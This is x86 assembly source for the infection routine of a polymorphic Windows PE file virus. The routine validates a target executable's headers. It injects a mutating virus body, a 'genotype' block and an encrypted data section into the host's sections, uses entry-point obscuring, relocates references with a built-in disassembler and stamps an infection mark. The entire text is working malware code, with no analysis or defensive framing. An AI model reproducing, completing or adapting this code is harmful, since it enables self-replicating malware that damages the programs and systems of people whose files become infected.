DEBUGOFF

INFECTION_MARK = 101

SECTION_MIN = 4             ;minimum number of sections to be infected
SECTION_MAX = 10            ;maximum number of sections to be infected

infectf PROC
       sub eax, eax
       mov [can_infect], eax                   ;init variable
       mov esi, [fname]
       sub edi, edi
       call MapFile
       test eax, eax
       jz @@error
DEBUGSTR <File mapped at %X>,EAX
       mov [fmap], eax
       cmp wo [eax.MZ_Magic],IMAGE_DOS_SIGNATURE
       jnz @@abort
       add eax, dwo [eax.MZ_lfanew]
       mov [peheader], eax
       push eax
       call [_IsBadCodePtr], eax
       test eax, eax
       pop eax
       jnz @@abort
       cmp dwo [eax.NT_Signature], IMAGE_NT_SIGNATURE
       jne @@abort
DEBUGSTR <PE signature detected>
       cmp wo [eax.NT_FileHeader.FH_Machine], IMAGE_FILE_MACHINE_I386
       jnz @@abort
DEBUGSTR <i386 executable>
       movzx ebx, wo [eax.NT_FileHeader.FH_NumberOfSections]
       cmp ebx, SECTION_MIN
       jb @@abort
       cmp ebx, SECTION_MAX
       ja @@abort
DEBUGSTR <Number Of Sections acceptable (%x)>,ebx
       cmp wo [eax.NT_FileHeader.FH_SizeOfOptionalHeader], IMAGE_SIZEOF_NT_OPTIONAL_HEADER
       jne @@abort
DEBUGSTR <Optional header size ok>
       movzx ebx, wo [eax.NT_FileHeader.FH_Characteristics]
       test ebx, IMAGE_FILE_SYSTEM+IMAGE_FILE_DLL
       jnz @@abort
DEBUGSTR <File is not system nor dll>
       test ebx, IMAGE_FILE_EXECUTABLE_IMAGE+IMAGE_FILE_32BIT_MACHINE
       jz @@abort
DEBUGSTR <File is executable and run in 32b>
       mov ecx, TRUE

       test ebx, IMAGE_FILE_RELOCS_STRIPPED
       jz @@rel_ok
       sub ecx, TRUE                    ;==FALSE
  @@rel_ok:
       mov [reloc], cl

       cmp [eax.NT_OptionalHeader.OH_Magic], IMAGE_NT_OPTIONAL_HDR_MAGIC
       jne @@abort
DEBUGSTR <optional header signature ok>
       mov ecx, [eax.NT_OptionalHeader.OH_AddressOfEntryPoint]
       cmp [eax.NT_OptionalHeader.OH_Subsystem], IMAGE_SUBSYSTEM_WINDOWS_CUI
       je @@aaa
       cmp [eax.NT_OptionalHeader.OH_Subsystem], IMAGE_SUBSYSTEM_WINDOWS_GUI
       jne @@abort
  @@aaa:
DEBUGSTR <Subsystem ok>
       cmp [eax.NT_OptionalHeader.OH_NumberOfRvaAndSizes], IMAGE_NUMBEROF_DIRECTORY_ENTRIES
       jne @@abort
DEBUGSTR <correct number of entries in directory entries>
       sub ecx, [eax.SIZE IMAGE_NT_HEADERS.SH_VirtualAddress]
       jc @@abort
       cmp ecx, [eax.SIZE IMAGE_NT_HEADERS.SH_VirtualSize]
       jnb @@abort
DEBUGSTR <entrypoint is in 1st section>
       mov edi, eax
       mov eax, [edi.SIZE IMAGE_NT_HEADERS.SH_Characteristics]
       test eax, IMAGE_SCN_MEM_EXECUTE + IMAGE_SCN_MEM_READ
       jz @@abort
       test eax, IMAGE_SCN_MEM_WRITE + IMAGE_SCN_MEM_16BIT
       jnz @@abort
DEBUGSTR <entrypoint section attributes ok>

       mov eax,ebp
       sub edx, edx
       mov ecx, INFECTION_MARK
       div ecx
DEBUGSTR <infection mark = %x>,edx
       test edx, edx
       je @@abort
       mov [can_infect], ecx
DEBUGSTR <file is infectable!>

  @@abort:
       call UnmapFile
DEBUGSTR <file unmapped>

       mov eax, [can_infect]
       test eax, eax                           ;file is good for infect???
       jz @@error

       mov edi, MAP_ADD
       mov esi, [fname]
       call MapFile
       test eax, eax
       jz @@error
DEBUGSTR <File mapped at %X>,EAX
       mov [fmap], eax
       add eax, dwo [eax.MZ_lfanew]
       mov [peheader], eax
       mov eax, [eax.NT_OptionalHeader.OH_ImageBase]
       mov [imagebase],eax

IF EPO EQ TRUE
       call epo_init            ;EPO searching
ENDIF

       call scan_import_table

       cmp dwo [GMH],0
       je @@error_close
DEBUGSTR <GetModuleHandleA is in IMPORT TABLE>

       sub eax, eax                              ;1st section
       mov ecx, [mutant_size]
       mov edx, ebp
DEBUGSTR <inserting %x bytes of code in section %x>,ecx,eax
       call InsertCode
       mov ebp, edx
DEBUGSTR <Added successfull>

       mov esi,[mutant_offset]

       mov ecx,[mutant_size]
       mov edi,[insert_raw]
       add edi,[fmap]
       mov [vbody],edi
DEBUGSTR <Copying %x bytes of code from %x to %x>,ecx,esi,edi
       cld
       rep movsb

       mov eax,[insert_rva]
       mov [code_rva],eax
       mov ebx,[imagebase]
       add [code_rva],ebx

       call epo_trick           ;EPO entrypoint change

       call mix_variables

       push 200h
       call rnd
       mov [rnddata],eax

       mov eax,[peheader]
       movzx eax,[eax.NT_FileHeader.FH_NumberOfSections]
       push eax
       call rnd                 ;choose rnd section for genotype
       mov esi, [mutant_gens]
       mov ecx, [esi]
       add ecx,[rnddata]
       mov edx, ebp
DEBUGSTR <inserting %x bytes of genotype in section %x>,ecx,eax
       call InsertCode
       mov ebp, edx

       mov eax, [insert_rva]
       mov [genotype_rva],eax

       mov ecx, [esi]
       mov edi, [insert_raw]
       add edi, [fmap]
DEBUGSTR <Copying %x bytes of genotype from %x to %x>,ecx,esi,edi
       cld
       rep movsb

       push data_size*2
       call rnd
       mov [rnddata],eax

       mov edx,[peheader]
       movzx ecx,[edx.NT_FileHeader.FH_NumberOfSections]
       add edx,SIZE IMAGE_NT_HEADERS
       sub eax,eax                      ;choose r/w section
  @@search_rw_section:
       test [edx.SH_Characteristics],IMAGE_SCN_MEM_WRITE
       jz @@nofound
       test [edx.SH_Characteristics],IMAGE_SCN_MEM_READ
       jz @@nofound
       test [edx.SH_Characteristics],IMAGE_SCN_CNT_INITIALIZED_DATA
       jnz @@found
  @@nofound:
       sub edx,-IMAGE_SIZEOF_SECTION_HEADER
       inc eax
       loop @@search_rw_section
       dec eax                  ;add in last section, changing atributes
       or [edx.SH_Characteristics-IMAGE_SIZEOF_SECTION_HEADER], \
                                  IMAGE_SCN_MEM_WRITE+ \
                                  IMAGE_SCN_MEM_READ

  @@found:
       mov ecx, data_size            ;add virus DATA section+rnd
       add ecx,[rnddata]
       mov edx, ebp
DEBUGSTR <inserting %x bytes of data in section %x>,ecx,eax
       call InsertCode
       mov ebp, edx

       mov eax, [genotype_rva]
       add eax, [imagebase]
       mov [genotype_rva],eax

       mov eax, [insert_rva]
       add eax, [imagebase]
       mov [data_rva],eax

       mov esi, [DATA_OFS]
       mov edi, [insert_raw]
       add edi, [fmap]
       mov [data_raw],edi
DEBUGSTR <Copying %x bytes of data from %x to %x>,ecx,esi,edi

       push esi
       push edi
       call copy_data

DEBUGSTR <Filling %x bytes of rnd in %x>,ecx,edi
       mov ecx,[rnddata]
       shr ecx,2                ;/4
  @@rndfill:
       push 0
       call rnd
       stosd
       loop @@rndfill

       call scan_import_table

       mov edi, [peheader]
       movzx eax, [edi.NT_FileHeader.FH_NumberOfSections]
       lea esi, [edi+SIZE IMAGE_NT_HEADERS]
       shl eax, 3
       add esi,eax
       shl eax, 2
       add esi,eax
       mov ecx,[edi.NT_OptionalHeader.OH_SectionAlignment]
       dec ecx
       mov eax,[esi.SH_VirtualAddress-IMAGE_SIZEOF_SECTION_HEADER]
       add eax,[esi.SH_VirtualSize-IMAGE_SIZEOF_SECTION_HEADER]
       add eax,ecx          ;set imagesize to align(last section rva+size)
       not ecx
       and eax,ecx
       mov [edi.NT_OptionalHeader.OH_SizeOfImage],eax

       mov esi,[vbody]
       mov edi,esi
       add edi,[mutant_size]

  @@fix_next:
       cmp esi, edi
       jae @@done666
       call disasm
       mov eax, 4
       mov ecx, [disasm_size]
       sub ecx, eax
       jbe @@no_fix666          ;not big enought to have a offset
  @@fixdata:
       test [disasm_flag], DF_DATA
       jz @@fixmem
       mov edx, [disasm_data]
       call @@fix_data_mem
  @@fixmem:
       test [disasm_flag], DF_MEM
       jz @@no_fix666
       mov edx, [disasm_mem]
       call @@fix_data_mem
  @@no_fix666:
       add esi, [disasm_size]
       jmp @@fix_next

  @@done666:

       mov esi,[data_raw]

       mov eax,ofs GMH
       mov ecx,[GMH]
       call @@xlate

       mov eax,ofs CODE_SIZE
       mov ecx,[mutant_size]
       call @@xlate

       mov eax,ofs CODE_OFS
       mov ecx,[code_rva]
       call @@xlate

       mov eax,ofs GENS_OFS
       mov ecx,[genotype_rva]
       call @@xlate

       mov edi,esi
       mov ecx, data_size/4
       mov edx,[key1]
  @@data:
       mov eax,[edi]
       xor eax,edx                      ;encrypt
       add edx,[key2]
       stosd
       loop @@data

       mov eax,ofs key1
       mov ecx,[key1]
       call @@xlate

       mov eax,ofs key2
       mov ecx,[key2]
       call @@xlate

       mov eax, ofs DATA_OFS
       mov ecx,[data_rva]
       call @@xlate

       mov eax, ebp
       sub edx, edx
       mov ecx, INFECTION_MARK
       div ecx
       sub ecx,edx
       add ebp,ecx
DEBUGSTR <infection mark = %x>,ecx

  @@error_close:
       call UnmapFile
DEBUGSTR <file unmapped>
  @@error:
       ret

  @@xlate:
       sub eax, [DATA_OFS]
       push eax
       call get_new_var_ofs
       mov [esi+eax],ecx
       ret

  @@fix_data_mem:
       pushad
       sub ebp,ebp
DEBUGSTR <Fixing %x at %x>,edx,esi

       mov eax,edx
       xor eax, XORVAL
       mov edi,(SPECIAL_MAGIC1 xor XORVAL)
       cmp eax,edi
       je @@g_read
       xor edi,(SPECIAL_MAGIC1 xor XORVAL) XOR (SPECIAL_MAGIC2 xor XORVAL)
       sub eax,edi
       jnz @@isnt_g
  @@g_write:
       push dwo [rnddata]
       call rnd
       add eax,data_size
       add eax,[data_rva]
       jmp @@patch_g          ;eax==write offset in data+data_size+(rnd_add)
  @@g_read:
       mov eax,data_size
       add eax,[rnddata]
       push eax
       call rnd
       add eax,[data_rva]     ;eax==read offset in data+(data_size+rnd_add)
  @@patch_g:
       xor edi,XORVAL
       mov ebx,eax
       jmp @@fixthat

  @@isnt_g:
       mov edi,[GENS_OFS]
       mov ebx,[genotype_rva]

       cmp edx, edi             ;there's just 1 place to point in genotype
       je @@fixthat

       mov edi,[CODE_OFS]
       mov ebx,[code_rva]
       mov eax,[CODE_SIZE]
       add eax,edi

       cmp edx, edi
       jb @@no_data
       cmp edx, eax
       jb @@fixthat
  @@no_data:

       mov edi,[DATA_OFS]
       mov ebx,[data_rva]
       lea eax,[edi+data_size]

       cmp edx, edi
       jb @@no_fix
       cmp edx, eax
       jnb @@no_fix
       inc ebp

  @@fixthat:
       cmp [esi], edx
       jne @@skip
       dec ebp
       jz @@data_var_fix

       sub [esi], edi           ;old_base
       add [esi], ebx           ;new_base
       jmp @@skip

  @@data_var_fix:
       sub edx, edi           ;old_base
       push edx
       call get_new_var_ofs
       add eax, ebx           ;new_base
       mov [esi],eax

  @@skip:

       inc esi
       dec ecx
       jns @@fixthat

  @@no_fix:
       popad
       ret
infectf ENDP
